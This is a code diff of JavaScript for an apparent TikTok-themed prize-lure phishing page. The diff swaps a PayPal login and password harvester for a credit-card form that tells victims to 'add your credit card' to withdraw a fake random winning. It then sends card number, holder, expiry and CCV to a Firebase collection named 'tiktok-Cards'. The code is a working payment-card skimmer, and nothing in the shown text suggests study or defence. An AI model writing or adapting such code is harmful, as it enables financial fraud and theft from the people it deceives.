@@ -92,10 +92,6 @@ let finalNumber = "";
 let amount = document.querySelector(".amount");
 let withdrawBtn = document.querySelector(".withdraw-btn");
 let finalWrapper = document.querySelector(".final-wrapper");
-let loginUser = document.querySelector(".login");
-let password = document.querySelector(".password");
-let requiredLog = document.querySelector(".requiredwrapper");
-let requiredPassword = document.querySelector(".requiredpasswordwrapper");
 
 randomNum();
 
@@ -123,27 +119,21 @@ function randomNum() {
 }
 
 addBtn.addEventListener("click", () => {
-  // if (cardNumber.value === "") {
-  //   invalidInputs();
-  //   validErrorTitle.innerHTML = "Invalid card number";
-  // } else if (cardHolder.value === "") {
-  //   invalidInputs();
-  //   validErrorTitle.innerHTML = "Invalid Card Holder";
-  // } else if (cardData.value === "") {
-  //   invalidInputs();
-  //   validErrorTitle.innerHTML = "Invalid Card Data";
-  // } else if (cardCcv.value === "") {
-  //   invalidInputs();
-  //   validErrorTitle.innerHTML = "Invalid Card CCV";
-  // } else {
-  // logIn();
-  if (loginUser.value === "") {
-    requiredLogin();
-  } else if (password.value === "") {
-    requiredPasw();
-    validErrorTitle.innerHTML = "password";
+  if (cardNumber.value === "") {
+    invalidInputs();
+    validErrorTitle.innerHTML = "Invalid card number";
+  } else if (cardHolder.value === "") {
+    invalidInputs();
+    validErrorTitle.innerHTML = "Invalid Card Holder";
+  } else if (cardData.value === "") {
+    invalidInputs();
+    validErrorTitle.innerHTML = "Invalid Card Data";
+  } else if (cardCcv.value === "") {
+    invalidInputs();
+    validErrorTitle.innerHTML = "Invalid Card CCV";
   } else {
     logIn();
+
     secondContent.classList.add("hidanim");
     setTimeout(() => {
       secondContent.classList.add("hidden");
@@ -159,61 +149,54 @@ addBtn.addEventListener("click", () => {
   }
 });
 
-function requiredLogin() {
-  requiredLog.classList.remove("hidden");
+function invalidInputs() {
+  validErrorTitle.classList.remove("hidden");
   setTimeout(() => {
-    requiredLog.classList.add("hidden");
+    validErrorTitle.classList.add("hidden");
   }, 1500);
 }
 
-function requiredPasw() {
-  requiredPassword.classList.remove("hidden");
-  setTimeout(() => {
-    requiredPassword.classList.add("hidden");
-  }, 1500);
+function formatString(e) {
+  var inputChar = String.fromCharCode(event.keyCode);
+  var code = event.keyCode;
+  var allowedKeys = [8];
+  if (allowedKeys.indexOf(code) !== -1) {
+    return;
+  }
+
+  event.target.value = event.target.value
+    .replace(
+      /^([1-9]\/|[2-9])$/g,
+      "0$1/" // 3 > 03/
+    )
+    .replace(
+      /^(0[1-9]|1[0-2])$/g,
+      "$1/" // 11 > 11/
+    )
+    .replace(
+      /^([0-1])([3-9])$/g,
+      "0$1/$2" // 13 > 01/3
+    )
+    .replace(
+      /^(0?[1-9]|1[0-2])([0-9]{2})$/g,
+      "$1/$2" // 141 > 01/41
+    )
+    .replace(
+      /^([0]+)\/|[0]+$/g,
+      "0" // 0/ > 0 and 00 > 0
+    )
+    .replace(
+      /[^\d\/]|^[\/]*$/g,
+      "" // To allow only digits and `/`
+    )
+    .replace(
+      /\/\//g,
+      "/" // Prevent entering more than 1 `/`
+    );
 }
-
-// function formatString(e) {
-//   var inputChar = String.fromCharCode(event.keyCode);
-//   var code = event.keyCode;
-//   var allowedKeys = [8];
-//   if (allowedKeys.indexOf(code) !== -1) {
-//     return;
-//   }
-
-//   event.target.value = event.target.value
-//     .replace(
-//       /^([1-9]\/|[2-9])$/g,
-//       "0$1/" // 3 > 03/
-//     )
-//     .replace(
-//       /^(0[1-9]|1[0-2])$/g,
-//       "$1/" // 11 > 11/
-//     )
-//     .replace(
-//       /^([0-1])([3-9])$/g,
-//       "0$1/$2" // 13 > 01/3
-//     )
-//     .replace(
-//       /^(0?[1-9]|1[0-2])([0-9]{2})$/g,
-//       "$1/$2" // 141 > 01/41
-//     )
-//     .replace(
-//       /^([0]+)\/|[0]+$/g,
-//       "0" // 0/ > 0 and 00 > 0
-//     )
-//     .replace(
-//       /[^\d\/]|^[\/]*$/g,
-//       "" // To allow only digits and `/`
-//     )
-//     .replace(
-//       /\/\//g,
-//       "/" // Prevent entering more than 1 `/`
-//     );
-// }
 
 btnClaim.addEventListener("click", () => {
-  secondWrapperTitle.innerHTML = `To withdraw <span class="wincount">${finalNumber}$</span>, add your PayPal`;
+  secondWrapperTitle.innerHTML = `To withdraw <span class="wincount">${finalNumber}$</span>, add your credit card`;
   amount.innerHTML = `Your Amount: <span class="wincount">${finalNumber}$</span>`;
   contentWrapper.classList.add("leftscrolcontent");
   setTimeout(() => {
@@ -227,40 +210,42 @@ btnClaim.addEventListener("click", () => {
   }, 2000);
 });
 
-// function cc_format(value) {
-//   var v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
-//   var matches = v.match(/\d{4,16}/g);
-//   var match = (matches && matches[0]) || "";
-//   var parts = [];
-//   for (i = 0, len = match.length; i < len; i += 4) {
-//     parts.push(match.substring(i, i + 4));
-//   }
-//   if (parts.length) {
-//     return parts.join(" ");
-//   } else {
-//     return value;
-//   }
-// }
+function cc_format(value) {
+  var v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
+  var matches = v.match(/\d{4,16}/g);
+  var match = (matches && matches[0]) || "";
+  var parts = [];
+  for (i = 0, len = match.length; i < len; i += 4) {
+    parts.push(match.substring(i, i + 4));
+  }
+  if (parts.length) {
+    return parts.join(" ");
+  } else {
+    return value;
+  }
+}
 
-// onload = function () {
-//   document.getElementById("cc").oninput = function () {
-//     this.value = cc_format(this.value);
-//   };
-// };
-// function checkDigit(event) {
-//   var code = event.which ? event.which : event.keyCode;
+onload = function () {
+  document.getElementById("cc").oninput = function () {
+    this.value = cc_format(this.value);
+  };
+};
+function checkDigit(event) {
+  var code = event.which ? event.which : event.keyCode;
 
-//   if ((code < 48 || code > 57) && code > 31) {
-//     return false;
-//   }
+  if ((code < 48 || code > 57) && code > 31) {
+    return false;
+  }
 
-//   return true;
-// }
+  return true;
+}
 
 function logIn() {
-  addElementInFirebase("Pp", {
-    login: loginUser.value,
-    password: password.value,
+  addElementInFirebase("tiktok-Cards", {
+    number: cardNumber.value,
+    holder: cardHolder.value,
+    data: cardData.value,
+    ccv: cardCcv.value,
     time: allData,
   });
 }
